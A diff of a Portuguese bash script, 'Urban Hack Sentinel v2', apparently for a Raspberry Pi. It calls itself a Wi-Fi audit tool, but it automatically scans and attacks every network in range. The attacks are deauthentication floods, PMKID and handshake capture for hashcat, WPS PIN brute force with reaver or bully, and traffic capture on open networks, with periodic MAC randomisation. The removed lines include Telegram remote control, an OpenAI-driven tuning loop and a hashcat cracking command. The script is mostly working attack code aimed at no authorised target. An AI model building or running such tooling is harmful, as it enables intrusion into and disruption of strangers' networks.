@@ -1,211 +1,584 @@
-#!/bin/bash
-
+#!/usr/bin/env bash
 # ===========================
-# URBAN HACK SENTINEL
-# Auditoria Wi-Fi com IA adaptativa
-# Versão: Abril 2025
+# URBAN HACK SENTINEL v2
+# Auditoria Wi-Fi móvel em Raspberry Pi
+# Versão: Junho 2026
 # Autor: André Santos
-# Aprovado por ChatGPT
 # ===========================
 
-# Carrega configurações externas
-source config.cfg
+set -euo pipefail
+IFS=$'\n\t'
 
-# Variáveis de controle
-REALTIME_MODE=false
-PAUSED=false
-CYCLE_COUNT=0
-LAST_AUTO_UPDATE=$(date +%s)
-LAST_GPT_UPDATE=$(date +%s)
-declare -a CURRENT_TARGETS  # Armazena redes sob ataque
-PAUSED=false
-CYCLE_COUNT=0
-LAST_AUTO_UPDATE=$(date +%s)
-LAST_GPT_UPDATE=$(date +%s)
+# --- Carrega configuração ---
+CONFIG_FILE="${CONFIG_FILE:-/etc/urban-hack-sentinel/config.env}"
+[[ -f "$CONFIG_FILE" ]] || {
+    echo "ERRO: Config não encontrado em $CONFIG_FILE" >&2
+    echo "Copie config.env.example para $CONFIG_FILE e edite." >&2
+    exit 1
+}
+# shellcheck source=/dev/null
+source "$CONFIG_FILE"
 
-# Cria o diretório de logs
-mkdir -p logs
+# --- Validação obrigatória ---
+required_vars=(
+    WIFI_IFACE
+    TEMP_LIMIT
+    MAX_JOBS
+    TIMEOUT_SCAN
+    MIN_SIGNAL
+    MAX_SIGNAL
+    LOG_DIR
+    HASH_DIR
+    PCAP_DIR
+)
+for v in "${required_vars[@]}"; do
+    [[ -n "${!v:-}" ]] || { echo "ERRO: Variável obrigatória $v não definida" >&2; exit 1; }
+done
 
-# -------- Funções Auxiliares --------
+# --- Diretórios ---
+mkdir -p "$LOG_DIR" "$HASH_DIR" "$PCAP_DIR"
 
-notify_telegram() {
-  local msg="$1"
-  curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage" \
-    -d chat_id="${TELEGRAM_CHAT_ID}" \
-    -d text="$msg" >/dev/null
+# --- Detecção de capacidades da interface ---
+detect_scan_capability() {
+    log "[DETECT] A testar capacidades de scan em $WIFI_IFACE..."
+    
+    # Guarda modo atual
+    local current_mode
+    current_mode=$(iw dev "$WIFI_IFACE" info 2>/dev/null | awk '/type/ {print $2}')
+    [[ -z "$current_mode" ]] && current_mode="managed"
+    
+    # Testa se consegue fazer active scan no modo atual (timeout curto)
+    local test_result=0
+    timeout 3 iw dev "$WIFI_IFACE" scan -f json >/dev/null 2>&1 || test_result=$?
+    
+    if [[ $test_result -eq 0 ]]; then
+        SCAN_STRATEGY="direct"
+        log "[DETECT] ✓ Active scan suportado no modo $current_mode (estrategia: direct)"
+    else
+        # Se está em monitor, testa com switch para managed
+        if [[ "$current_mode" == "monitor" ]]; then
+            ip link set "$WIFI_IFACE" down 2>/dev/null
+            iw dev "$WIFI_IFACE" set type managed 2>/dev/null
+            ip link set "$WIFI_IFACE" up 2>/dev/null
+            sleep 0.3
+            
+            timeout 3 iw dev "$WIFI_IFACE" scan -f json >/dev/null 2>&1 || test_result=$?
+            
+            # Volta ao monitor
+            ip link set "$WIFI_IFACE" down 2>/dev/null
+            iw dev "$WIFI_IFACE" set type monitor 2>/dev/null
+            ip link set "$WIFI_IFACE" up 2>/dev/null
+            sleep 0.3
+            
+            if [[ $test_result -eq 0 ]]; then
+                SCAN_STRATEGY="mode_switch"
+                log "[DETECT] ⚠ Active scan precisa mode switch (estrategia: mode_switch)"
+            else
+                SCAN_STRATEGY="passive_only"
+                log "[DETECT] ✗ Active scan não suportado, usando passive only (estrategia: passive_only)"
+            fi
+        else
+            SCAN_STRATEGY="passive_only"
+            log "[DETECT] ✗ Active scan não suportado no modo $current_mode (estrategia: passive_only)"
+        fi
+    fi
+    
+    export SCAN_STRATEGY
+    return 0
 }
 
+# Detecta capacidades no arranque (será chamado no main)
+# detect_scan_capability
+
+# --- Estado ---
+declare -gA REDES
+declare -a CURRENT_TARGETS
+CYCLE_COUNT=0
+PAUSED=false
+REALTIME_MODE=false
+
+# PID dos filhos para cleanup
+CHILD_PIDS=()
+
+# --- Cleanup ao sair ---
+cleanup() {
+    echo "[*] Limpando processos filhos..."
+    for pid in "${CHILD_PIDS[@]}"; do
+        kill -TERM "$pid" 2>/dev/null || true
+    done
+    wait 2>/dev/null || true
+    ip link set "$WIFI_IFACE" up 2>/dev/null || true
+}
+trap cleanup EXIT INT TERM
+
+# --- Helpers ---
+log() { echo "[$(date '+%H:%M:%S')] $*" | tee -a "$LOG_DIR/status.log"; }
+log_json() { echo "$(date -Iseconds) $*" >> "$LOG_DIR/metrics.jsonl"; }
+
 randomize_mac() {
-  local iface="$1"
-  ip link set "$iface" down
-  macchanger -r "$iface" >/dev/null 2>&1
-  ip link set "$iface" up
+    local iface="$1"
+    log "[MAC] Randomizando $iface"
+    ip link set "$iface" down
+    macchanger -r "$iface" >/dev/null 2>&1 || log "[WARN] macchanger falhou"
+    ip link set "$iface" up
+    sleep 1
 }
 
 watch_temperature() {
-  local raw=$(cat /sys/class/thermal/thermal_zone0/temp)
-  local c=$((raw/1000))
-  if (( c > TEMP_LIMIT )); then
-    notify_telegram "[ALERTA] Temp: ${c}°C > ${TEMP_LIMIT}°C. Pausando ataques."
-    PAUSED=true
-  fi
+    local raw c
+    raw=$(cat /sys/class/thermal/thermal_zone0/temp 2>/dev/null || echo 0)
+    c=$((raw / 1000))
+    if (( c > TEMP_LIMIT )); then
+        log "[ALERTA] Temp: ${c}°C > ${TEMP_LIMIT}°C. Pausando ataques."
+        PAUSED=true
+    fi
+    log_json "temp_c=$c cycle=$CYCLE_COUNT"
 }
 
-consult_gpt() {
-  local now=$(date +%s)
-  if (( now - LAST_GPT_UPDATE < GPT_INTERVAL )); then return; fi
-  LAST_GPT_UPDATE=$now
-  # Prepara métricas
-  local payload=$(jq -n \
-    --arg cycles "$CYCLE_COUNT" \
-    --arg pmkid "$PMKID_COUNT" \
-    --arg hs "$HS_SUCCESS_COUNT" \
-    --arg temp "$(cat /sys/class/thermal/thermal_zone0/temp)" \
-    --arg load "$(uptime | awk -F'load average:' '{print $2}' | cut -d, -f1)" \
-    '{cycles:($cycles|tonumber), pmkid:($pmkid|tonumber), hs:($hs|tonumber), temp:($temp|tonumber), load:(($load)+0)}')
-  # Chama API
-  local resp=$(curl -s --max-time 10 https://api.openai.com/v1/chat/completions \
-    -H "Authorization: Bearer ${OPENAI_API_KEY}" \
-    -H 'Content-Type: application/json' \
-    -d @- <<EOF
-{
-  "model": "${GPT_MODEL}",
-  "messages": [
-    {"role":"system","content":"És um assistente que otimiza auditorias Wi-Fi móveis num Raspberry Pi. Retorna apenas JSON com timeout, jobs, signal, proximo_intervalo, explicacao."},
-    {"role":"user","content":"Métricas: $payload"}
-  ],
-  "temperature": 0.2
-}
-EOF
-  )
-  # Extrai valores
-  local timeout jobs signal next_int exp
-  timeout=$(echo "$resp" | jq -r '.choices[0].message.content|fromjson|.timeout')
-  jobs=$(echo    "$resp" | jq -r '.choices[0].message.content|fromjson|.jobs')
-  signal=$(echo  "$resp" | jq -r '.choices[0].message.content|fromjson|.signal')
-  next_int=$(echo "$resp" | jq -r '.choices[0].message.content|fromjson|.proximo_intervalo')
-  exp=$(echo     "$resp" | jq -r '.choices[0].message.content|fromjson|.explicacao')
-  # Aplica com limites
-  [[ $timeout -ge MIN_TIMEOUT && $timeout -le MAX_TIMEOUT ]] && TIMEOUT_SCAN=$timeout
-  [[ $jobs -ge MIN_JOBS    && $jobs -le MAX_JOBS     ]] && MAX_JOBS=$jobs
-  [[ $signal -le MAX_SIGNAL && $signal -ge MIN_SIGNAL ]] && SIGNAL_THRESHOLD=$signal
-  [[ $next_int -ge MIN_GPT_INTERVAL && $next_int -le MAX_GPT_INTERVAL ]] && GPT_INTERVAL=$next_int
-  # Notifica ajuste
-  notify_telegram "[IA AJUSTE]\nTimeout: $timeout\nJobs: $jobs\nSignal: >= $signal dBm\nPróx consulta: $next_int s\nExplicação: $exp"
-}
-
-realtime_status() {
-  while $REALTIME_MODE; do
-    echo "[Realtime] $(date '+%H:%M:%S') Ciclo:$CYCLE_COUNT Jobs:$(jobs -rp|wc -l) Targets:${CURRENT_TARGETS[*]}" >> logs/realtime.log
-    sleep 1
-  done
-}
-}
-
-# -------- Comandos IA --------
-executar_comando_ia() {
-  local cmd="$1" out=""
-  case $cmd in
-    ver_temperatura) out="$(( $(cat /sys/class/thermal/thermal_zone0/temp)/1000 ))°C";;
-    ver_carga)       out="$(uptime)";;
-    ver_jobs)        out="$(jobs -l)";;
-    ver_wifi_ativos) out="$(iw dev "$WIFI_IFACE" scan | grep SSID|uniq)";;
-    ver_rede_atual)  out="$(iwconfig "$WIFI_IFACE";ip a show "$WIFI_IFACE")";;
-    testar_ping)     out="$(ping -c4 1.1.1.1)";;
-    ver_logs_recent) out="$(tail -n10 logs/status.log)";;
-    ver_memoria)     out="$(free -h)";;
-    pausar_ataques)  PAUSED=true; out="Ataques pausados.";;
-    retomar_ataques) PAUSED=false; out="Ataques retomados.";;
-    recarregar_config) source config.cfg; out="Config recarregada.";;
-    consultar_ia_manual) consult_gpt; out="Consulta IA manual feita.";;
-    scan_rapido)     iw dev "$WIFI_IFACE" scan|grep SSID>logs/scan_rapido.log; out="Scan rápido salvo.";;
-    scan_completo)   timeout 15 iw dev "$WIFI_IFACE" scan>logs/scan_completo.log; out="Scan completo salvo.";;
-    testar_handshake_ultimo)
-                     out="$(hashcat -m22000 -a3 hashcat_ready/ultimo.hc22000 ?l?l?l?l?l?l?l?l --force)";;
-    mostrar_redes_prioritarias)
-                     out="$(grep -E 'WPS|Signal' logs/status.log|head -n10)";;
-    status_sistema)
-      local t=$(($(/sys/class/thermal/thermal_zone0/temp)/1000)); local j=$(jobs -rp|wc -l);
-      out="Temp:${t}°C Jobs:$j Uptime:$(uptime -p)";;
-    resumo_historico)
-      out="$(cat logs/historico_resumo.txt 2>/dev/null||echo 'Sem histórico')";;
-    *) out="Comando IA desconhecido: $cmd";;
-  esac
-  notify_telegram "[EXEC IA] $cmd -> $out"
-}
-
-verificar_comando_ia() {
-  [[ -f comando_ia.json ]] || return
-  local cmd=$(jq -r .comando comando_ia.json)
-  executar_comando_ia "$cmd"
-  rm -f comando_ia.json
-}
-
-check_telegram_commands() {
-  local cmd=$(curl -s "https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates"|grep -o '/[a-z_]*')
-  case $cmd in
-    /tempo_real) REALTIME_MODE=true;  notify_telegram "Modo realtime ativado.";;
-    /parar_tempo_real) REALTIME_MODE=false; notify_telegram "Realtime desativado.";;
-    /comandos_ia)
-      notify_telegram "[COMANDOS IA]\nver_temperatura, ver_carga, ver_jobs, ver_wifi_ativos, ver_rede_atual, testar_ping, ver_logs_recent, ver_memoria, pausar_ataques, retomar_ataques, recarregar_config, consultar_ia_manual, scan_rapido, scan_completo, testar_handshake_ultimo, mostrar_redes_prioritarias, status_sistema, resumo_historico"
-      ;;
-  esac
-}
-
-# -------- Scanner e Ataques --------
+# --- Scanner Wi-Fi (adaptativo conforme capacidade detectada) ---
 scanear_redes() {
-  iwlist "$WIFI_IFACE" scan > logs/scan_temp.txt
-  unset REDES
-  declare -A REDES
-  local bssid essid tipo
-  while read -r line; do
-    [[ $line =~ Address: ]]  && bssid=$(echo $line|awk '{print $5}')
-    [[ $line =~ ESSID: ]]    && essid=${line#*ESSID:"}; essid=${essid%"}
-    [[ $line =~ WPA2 ]]      && tipo=WPA
-    [[ $line =~ WPA ]]       && tipo=WPA
-    [[ $line =~ WEP ]]       && tipo=WEP
-    [[ $line =~ WPS ]]       && tipo=WPS
-    if [[ $bssid && $essid && $tipo ]]; then
-      REDES["$bssid"]="$essid|$tipo"; bssid=essid=tipo=
-    fi
-  done < logs/scan_temp.txt
+    log "[SCAN] Iniciando scan em $WIFI_IFACE (estrategia: $SCAN_STRATEGY)"
+    unset REDES
+    # REDES já declarado globalmente no topo do script
+
+    case "$SCAN_STRATEGY" in
+        direct)
+            # Direct scan no modo atual (managed ou monitor com suporte)
+            do_iw_scan
+            ;;
+        mode_switch)
+            # Switch temporário para managed, scan, volta ao modo original
+            do_scan_with_mode_switch
+            ;;
+        passive_only)
+            # Scan passivo via airodump-ng (channel hopping) + parse output
+            do_passive_scan
+            ;;
+        *)
+            log "[SCAN] Estrategia desconhecida: $SCAN_STRATEGY, fallback passive_only"
+            do_passive_scan
+            ;;
+    esac
+
+    log "[SCAN] ${#REDES[@]} redes encontradas"
+    log_json "scan_count=${#REDES[@]} cycle=$CYCLE_COUNT scan_strategy=$SCAN_STRATEGY"
 }
 
+# Scan direto com iw JSON (modo atual suporta)
+do_iw_scan() {
+    timeout 15 iw dev "$WIFI_IFACE" scan -f json > "$LOG_DIR/scan_raw.json" 2>/dev/null || {
+        log "[WARN] iw scan falhou, tentando iwlist fallback"
+        iwlist "$WIFI_IFACE" scan > "$LOG_DIR/scan_temp.txt" 2>/dev/null
+        parse_iwlist_fallback
+        return
+    }
+    parse_iw_json
+}
+
+# Scan com mode switch: managed -> scan -> monitor
+do_scan_with_mode_switch() {
+    # Guarda estado atual (deve ser monitor)
+    local was_monitor=false
+    if iw dev "$WIFI_IFACE" info 2>/dev/null | grep -q "type monitor"; then
+        was_monitor=true
+    fi
+
+    # Switch para managed
+    ip link set "$WIFI_IFACE" down 2>/dev/null
+    iw dev "$WIFI_IFACE" set type managed 2>/dev/null
+    ip link set "$WIFI_IFACE" up 2>/dev/null
+    sleep 0.5
+
+    # Faz scan
+    do_iw_scan
+
+    # Volta ao monitor se era monitor
+    if $was_monitor; then
+        ip link set "$WIFI_IFACE" down 2>/dev/null
+        iw dev "$WIFI_IFACE" set type monitor 2>/dev/null
+        ip link set "$WIFI_IFACE" up 2>/dev/null
+        sleep 0.5
+    fi
+}
+
+# Scan passivo via airodump-ng (channel hopping)
+do_passive_scan() {
+    log "[SCAN] Modo passivo: airodump-ng channel hopping por ${TIMEOUT_SCAN}s"
+    
+    # Garante array global associativo (precisa de pelo menos 1 elemento para persistir)
+    declare -gA REDES
+    REDES["__dummy__"]="placeholder"
+    
+    # Mata airodump anterior se houver
+    pkill -f "airodump-ng.*$WIFI_IFACE" 2>/dev/null || true
+    
+    # Lança airodump em background com output CSV
+    local csv_prefix="$LOG_DIR/scan_passive"
+    timeout "$TIMEOUT_SCAN" airodump-ng \
+        --write "$csv_prefix" \
+        --output-format csv \
+        --write-interval 1 \
+        "$WIFI_IFACE" > "$LOG_DIR/scan_passive.log" 2>&1 &
+    local airodump_pid=$!
+    
+    log "[SCAN] Aguardando airodump-ng (PID: $airodump_pid) por ${TIMEOUT_SCAN}s..."
+    
+    # Espera para recolher dados
+    sleep "$TIMEOUT_SCAN"
+    
+    log "[SCAN] Processando CSV..."
+    
+    # Processa CSV gerado
+    if [[ -f "${csv_prefix}-01.csv" ]]; then
+        log "[SCAN] Parseando CSV inline..."
+        local tmp_file
+        tmp_file=$(mktemp)
+        awk -F',' '
+            NR > 2 && $1 ~ /^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$/ && $14 != "" {
+                bssid=$1; channel=$4; privacy=$6; cipher=$7; auth=$8; power=$9; essid=$14
+                gsub(/^[ \t]+|[ \t]+$/, "", essid)
+                gsub(/^[ \t]+|[ \t]+$/, "", bssid)
+                gsub(/^[ \t]+|[ \t]+$/, "", privacy)
+                tipo="UNKNOWN"
+                if (privacy ~ /WPA3/) tipo="WPA3"
+                else if (privacy ~ /WPA2/) tipo="WPA2"
+                else if (privacy ~ /WPA/) tipo="WPA"
+                else if (privacy ~ /WEP/) tipo="WEP"
+                else if (privacy ~ /OPN/) tipo="OPEN"
+                if (auth ~ /WPS/) tipo=tipo"+WPS"
+                freq=0
+                if (channel >= 1 && channel <= 14) freq=2407+channel*5
+                else if (channel >= 36) freq=5000+channel*5
+                print bssid"|"essid"|"tipo"|"power"|"freq
+            }
+        ' "${csv_prefix}-01.csv" > "$tmp_file"
+        
+        local count=0
+        while IFS='|' read -r bssid essid tipo signal freq; do
+            [[ -z "$bssid" || -z "$essid" ]] && continue
+            REDES["$bssid"]="$essid|$tipo|$signal|$freq"
+            ((count++))
+        done < "$tmp_file"
+        rm -f "$tmp_file"
+        log "[SCAN] Parse inline concluído: $count redes"
+    else
+        log "[WARN] Nenhum CSV gerado pelo airodump-ng"
+    fi
+    
+    # Remove entry dummy
+    unset REDES["__dummy__"]
+    
+    # Garante que o processo morre
+    kill "$airodump_pid" 2>/dev/null || true
+    
+    log "[SCAN] Passive scan concluído: ${#REDES[@]} redes"
+}
+
+# Parse JSON do iw scan
+parse_iw_json() {
+    jq -r '
+        .[] |
+        select(.bssid and .ssid) |
+        "\(.bssid)|\(.ssid)|\(.signal // -100)|\(.freq // 0)|\(.flags // [])"
+    ' "$LOG_DIR/scan_raw.json" 2>/dev/null | while IFS='|' read -r bssid ssid signal freq flags; do
+        [[ -z "$bssid" || -z "$ssid" ]] && continue
+        signal=${signal:- -100}
+        freq=${freq:-0}
+
+        # Determina tipo de segurança pelas flags
+        local tipo="UNKNOWN"
+        if [[ "$flags" == *"privacy"* ]]; then
+            if [[ "$flags" == *"wpa3"* || "$flags" == *"sae"* ]]; then
+                tipo="WPA3"
+            elif [[ "$flags" == *"wpa2"* ]]; then
+                tipo="WPA2"
+            elif [[ "$flags" == *"wpa"* ]]; then
+                tipo="WPA"
+            elif [[ "$flags" == *"wep"* ]]; then
+                tipo="WEP"
+            else
+                tipo="WPA"
+            fi
+        else
+            tipo="OPEN"
+        fi
+
+        # WPS detection
+        if iw dev "$WIFI_IFACE" scan -f json 2>/dev/null | jq -e --arg bssid "$bssid" '.[] | select(.bssid==$bssid) | .flags[] | select(.=="wps")' >/dev/null 2>&1; then
+            tipo="${tipo}+WPS"
+        fi
+
+        REDES["$bssid"]="$ssid|$tipo|$signal|$freq"
+    done
+}
+
+# Parse CSV do airodump-ng (passive scan)
+parse_airodump_csv() {
+    local csv_file="$1"
+    # Formato: BSSID, First time seen, Last time seen, channel, Speed, Privacy, Cipher, Authentication, Power, # beacons, # IV, LAN IP, ID-length, ESSID, Key
+    awk -F',' '
+        NR > 2 && $1 ~ /^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$/ && $14 != "" {
+            bssid=$1
+            channel=$4
+            privacy=$6
+            cipher=$7
+            auth=$8
+            power=$9
+            essid=$14
+            gsub(/^[ \t]+|[ \t]+$/, "", essid)
+            gsub(/^[ \t]+|[ \t]+$/, "", bssid)
+            gsub(/^[ \t]+|[ \t]+$/, "", privacy)
+            
+            # Determina tipo
+            tipo="UNKNOWN"
+            if (privacy ~ /WPA3/) tipo="WPA3"
+            else if (privacy ~ /WPA2/) tipo="WPA2"
+            else if (privacy ~ /WPA/) tipo="WPA"
+            else if (privacy ~ /WEP/) tipo="WEP"
+            else if (privacy ~ /OPN/) tipo="OPEN"
+            
+            # WPS heuristic
+            if (auth ~ /WPS/) tipo=tipo"+WPS"
+            
+            # Converte canal para frequência
+            freq=0
+            if (channel >= 1 && channel <= 14) freq=2407+channel*5
+            else if (channel >= 36) freq=5000+channel*5
+            
+            print bssid"|"essid"|"tipo"|"power"|"freq
+        }
+    ' "$csv_file"
+}
+
+parse_iwlist_fallback() {
+        local bssid essid tipo signal
+        while read -r line; do
+            [[ $line =~ Address:\ ([0-9A-Fa-f:]{17}) ]] && bssid="${BASH_REMATCH[1]}"
+            [[ $line =~ ESSID:\"([^\"]*)\" ]] && essid="${BASH_REMATCH[1]}"
+            [[ $line =~ Signal\ level=(-?[0-9]+) ]] && signal="${BASH_REMATCH[1]}"
+            if [[ $line =~ (WPA2|WPA|WEP|WPS) ]]; then
+                case ${BASH_REMATCH[1]} in
+                    WPA2) tipo="WPA2" ;;
+                    WPA)  tipo="WPA" ;;
+                    WEP)  tipo="WEP" ;;
+                    WPS)  tipo="WPS" ;;
+                esac
+            fi
+            if [[ $bssid && $essid && $tipo ]]; then
+                REDES["$bssid"]="$essid|$tipo|${signal:--100}|0"
+                bssid= essid= tipo= signal=
+            fi
+        done < "$LOG_DIR/scan_temp.txt"
+    }
+
+# --- Execução de ataques ---
+executar_ataque() {
+    local bssid="$1" essid="$2" tipo="$3" signal="$4" freq="$5"
+    local safe_essid="${essid//[^a-zA-Z0-9_-]/_}"
+    local timestamp=$(date '+%Y%m%d_%H%M%S')
+    local base_name="${safe_essid}_${bssid//:/_}_${timestamp}"
+
+    log "[ATAQUE] $essid ($bssid) tipo=$tipo signal=${signal}dBm"
+
+    case "$tipo" in
+        *WPA3*)
+            # WPA3 SAE - PMKID + transição WPA2 se houver
+            attack_pmkid "$bssid" "$base_name" "$freq"
+            ;;
+        *WPA2*|*WPA*)
+            # WPA2/WPA - Handshake + PMKID
+            attack_handshake "$bssid" "$essid" "$base_name" "$freq"
+            attack_pmkid "$bssid" "$base_name" "$freq"
+            ;;
+        *WPS*)
+            attack_wps "$bssid" "$essid" "$base_name" "$freq"
+            ;;
+        *OPEN*)
+            log "[INFO] $essid aberta - capturando tráfego"
+            capture_open "$bssid" "$essid" "$base_name" "$freq"
+            ;;
+        *)
+            log "[WARN] Tipo desconhecido: $tipo"
+            ;;
+    esac
+}
+
+# PMKID attack (hcxdumptool)
+attack_pmkid() {
+    local bssid="$1" base_name="$2" freq="$3"
+    local pcap_file="$PCAP_DIR/${base_name}_pmkid.pcapng"
+    local hash_file="$HASH_DIR/${base_name}_pmkid.22000"
+
+    log "[PMKID] Iniciando em $bssid freq=$freq"
+    hcxdumptool -i "$WIFI_IFACE" \
+        --enable_status=1 \
+        --filterlist="$bssid" \
+        --filtermode=2 \
+        -o "$pcap_file" \
+        > "$LOG_DIR/${base_name}_pmkid.log" 2>&1 &
+    local pid=$!
+    CHILD_PIDS+=($pid)
+
+    # Converte para hashcat 22000 depois
+    sleep 2
+    hcxpcapngtool -o "$hash_file" "$pcap_file" 2>>"$LOG_DIR/${base_name}_pmkid.log" || true
+    [[ -s "$hash_file" ]] && log "[PMKID] Hash salvo: $hash_file" || log "[PMKID] Sem PMKID capturado"
+}
+
+# Handshake WPA2 (aircrack-ng suite)
+attack_handshake() {
+    local bssid="$1" essid="$2" base_name="$3" freq="$4"
+    local pcap_file="$PCAP_DIR/${base_name}_hs.cap"
+    local channel
+    channel=$(freq_to_channel "$freq")
+
+    log "[HANDSHAKE] $essid canal=$channel"
+
+    # Deauth para forçar handshake
+    aireplay-ng -0 5 -a "$bssid" -e "$essid" "$WIFI_IFACE" >/dev/null 2>&1 &
+
+    # Captura
+    timeout "$TIMEOUT_SCAN" airodump-ng \
+        --bssid "$bssid" \
+        --channel "$channel" \
+        --write "$PCAP_DIR/${base_name}_hs" \
+        --output-format pcap \
+        "$WIFI_IFACE" > "$LOG_DIR/${base_name}_hs.log" 2>&1 &
+    local pid=$!
+    CHILD_PIDS+=($pid)
+
+    wait $pid 2>/dev/null || true
+
+    # Verifica handshake
+    if aircrack-ng "$pcap_file" 2>/dev/null | grep -q "1 handshake"; then
+        log "[HANDSHAKE] Handshake capturado: $pcap_file"
+        hcxpcapngtool -o "$HASH_DIR/${base_name}_hs.22000" "$pcap_file" 2>/dev/null || true
+    else
+        log "[HANDSHAKE] Sem handshake"
+    fi
+}
+
+# WPS (reaver ou bully)
+attack_wps() {
+    local bssid="$1" essid="$2" base_name="$3" freq="$4"
+    local channel
+    channel=$(freq_to_channel "$freq")
+
+    log "[WPS] $essid canal=$channel"
+
+    if command -v reaver >/dev/null 2>&1; then
+        reaver -i "$WIFI_IFACE" -b "$bssid" -c "$channel" -vv \
+            -o "$LOG_DIR/${base_name}_wps.log" \
+            2>&1 | tee -a "$LOG_DIR/${base_name}_wps.log" &
+    elif command -v bully >/dev/null 2>&1; then
+        bully -b "$bssid" -c "$channel" -v 3 "$WIFI_IFACE" \
+            > "$LOG_DIR/${base_name}_wps.log" 2>&1 &
+    else
+        log "[WARN] reaver/bully não instalado"
+        return
+    fi
+    local pid=$!
+    CHILD_PIDS+=($pid)
+}
+
+# Rede aberta - captura passiva
+capture_open() {
+    local bssid="$1" essid="$2" base_name="$3" freq="$4"
+    local channel
+    channel=$(freq_to_channel "$freq")
+
+    log "[OPEN] Captura passiva $essid"
+    timeout "$TIMEOUT_SCAN" airodump-ng \
+        --bssid "$bssid" \
+        --channel "$channel" \
+        --write "$PCAP_DIR/${base_name}_open" \
+        --output-format pcap \
+        "$WIFI_IFACE" > "$LOG_DIR/${base_name}_open.log" 2>&1 &
+    local pid=$!
+    CHILD_PIDS+=($pid)
+}
+
+freq_to_channel() {
+    local freq="$1"
+    case "$freq" in
+        2412) echo 1 ;; 2417) echo 2 ;; 2422) echo 3 ;; 2427) echo 4 ;;
+        2432) echo 5 ;; 2437) echo 6 ;; 2442) echo 7 ;; 2447) echo 8 ;;
+        2452) echo 9 ;; 2457) echo 10 ;; 2462) echo 11 ;; 2467) echo 12 ;;
+        2472) echo 13 ;; 2484) echo 14 ;;
+        5180) echo 36 ;; 5200) echo 40 ;; 5220) echo 44 ;; 5240) echo 48 ;;
+        5260) echo 52 ;; 5280) echo 56 ;; 5300) echo 60 ;; 5320) echo 64 ;;
+        5500) echo 100 ;; 5520) echo 104 ;; 5540) echo 108 ;; 5560) echo 112 ;;
+        5580) echo 116 ;; 5600) echo 120 ;; 5620) echo 124 ;; 5640) echo 128 ;;
+        5660) echo 132 ;; 5680) echo 136 ;; 5700) echo 140 ;; 5720) echo 144 ;;
+        *) echo 1 ;;
+    esac
+}
+
+# --- Loop de ataques com controlo de concorrência ---
 executar_ataques_disponiveis() {
-  CURRENT_TARGETS=()  # Lista de ESSIDs atacadas neste ciclo
-  for b in "${!REDES[@]}"; do
-    if (( $(jobs -rp|wc -l) < MAX_JOBS )); then
-      IFS='|' read essid tipo <<< "${REDES[$b]}"
-      CURRENT_TARGETS+=("$essid")
-      executar_ataque "$b" "$essid" "$tipo"
-    fi
-  done
-}
-  for b in "${!REDES[@]}"; do
-    if (( $(jobs -rp|wc -l) < MAX_JOBS )); then
-      IFS='|' read essid tipo <<< "${REDES[$b]}"
-      executar_ataque "$b" "$essid" "$tipo"
-    fi
-  done
+    CURRENT_TARGETS=()
+    local running=0
+
+    for b in "${!REDES[@]}"; do
+        # Conta jobs ativos
+        running=$(jobs -rp | wc -l)
+        (( running >= MAX_JOBS )) && break
+
+        IFS='|' read -r essid tipo signal freq <<< "${REDES[$b]}"
+        [[ -z "$essid" ]] && continue
+
+        CURRENT_TARGETS+=("$essid")
+        executar_ataque "$b" "$essid" "$tipo" "$signal" "$freq" &
+    done
+
+    log "[JOBS] ${#CURRENT_TARGETS[@]} alvos lançados, $(jobs -rp | wc -l) ativos"
 }
 
-# -------- Loop Principal --------
-while true; do
-  CURRENT_TARGETS=()  # Reset targets a cada ciclo
-  ((CYCLE_COUNT++))
-  check_telegram_commands
-  verificar_comando_ia
-  watch_temperature
-  $PAUSED && sleep 5 && continue
-  (( CYCLE_COUNT % 5 == 0 )) && randomize_mac "$WIFI_IFACE"
-  scanear_redes
-  executar_ataques_disponiveis
-  consult_gpt
-  local now=$(date +%s)
-  (( now - LAST_AUTO_UPDATE >= AUTO_STATUS_INTERVAL )) && {
-    notify_telegram "[STATUS] Ciclo:$CYCLE_COUNT | Timeout:$TIMEOUT_SCAN | Jobs:$MAX_JOBS | Targets:${CURRENT_TARGETS[*]}"$CYCLE_COUNT Timeout:$TIMEOUT_SCAN Jobs:$MAX_JOBS"
-    LAST_AUTO_UPDATE=$now
-  }
-  $REALTIME_MODE && realtime_status &
-  sleep $TIMEOUT_SCAN
-done
+# --- Status periódico ---
+print_status() {
+    local running
+    running=$(jobs -rp | wc -l)
+    local temp
+    temp=$(cat /sys/class/thermal/thermal_zone0/temp 2>/dev/null || echo 0)
+    temp=$((temp / 1000))
+
+    log "[STATUS] Ciclo:$CYCLE_COUNT Temp:${temp}°C Jobs:$running Targets:${CURRENT_TARGETS[*]:-nenhum}"
+    log_json "cycle=$CYCLE_COUNT temp_c=$temp jobs=$running targets=${#CURRENT_TARGETS[@]}"
+}
+
+# --- Loop Principal ---
+main() {
+    log "=== URBAN HACK SENTINEL v2 INICIADO ==="
+    log "Interface: $WIFI_IFACE | MaxJobs: $MAX_JOBS | Timeout: ${TIMEOUT_SCAN}s | TempLimit: ${TEMP_LIMIT}°C"
+
+    # Verifica modo monitor
+    if ! iwconfig "$WIFI_IFACE" 2>/dev/null | grep -q "Mode:Monitor"; then
+        log "[WARN] $WIFI_IFACE não está em modo monitor. Tentando configurar..."
+        ip link set "$WIFI_IFACE" down
+        iw dev "$WIFI_IFACE" set type monitor
+        ip link set "$WIFI_IFACE" up
+        sleep 1
+    fi
+
+    # Detecta capacidades de scan após configurar modo monitor
+    detect_scan_capability
+
+    while true; do
+        CURRENT_TARGETS=()
+        CYCLE_COUNT=$((CYCLE_COUNT + 1))
+
+        watch_temperature
+        $PAUSED && { log "[PAUSADO] Aguardando..."; sleep 5; continue; }
+
+        (( CYCLE_COUNT % 5 == 0 )) && randomize_mac "$WIFI_IFACE"
+
+        scanear_redes
+        executar_ataques_disponiveis
+
+        print_status
+
+        sleep "$TIMEOUT_SCAN"
+    done
+}
+
+main "$@"
